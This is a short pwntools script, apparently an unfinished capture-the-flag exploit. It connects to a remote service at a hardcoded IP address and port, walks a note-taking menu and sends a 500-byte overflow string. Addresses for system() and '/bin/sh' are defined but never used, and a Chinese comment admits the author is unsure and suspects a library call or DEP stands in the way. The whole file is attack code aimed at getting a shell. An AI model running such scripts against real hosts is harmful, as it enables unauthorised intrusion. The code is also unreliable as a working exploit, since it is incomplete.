#!/usr/bin/python

from pwn import *

context.arch = "i386"
r = remote("124.16.75.117", 51002)
shelladdr = 0x8048652
systemfun = 0x8048490
bin_sh = 0x8048978
r.sendlineafter(b"input your name:", b"jiuhao\n")
r.sendlineafter(b"choice:>>", b"1")
r.sendlineafter(b"Please input your note:", b"a" * 500)
r.sendlineafter(b"choice:>>", b"2")
r.interactive()
##?? 有些不太懂，但是这里疑似要调动态库（或者是有DEP）
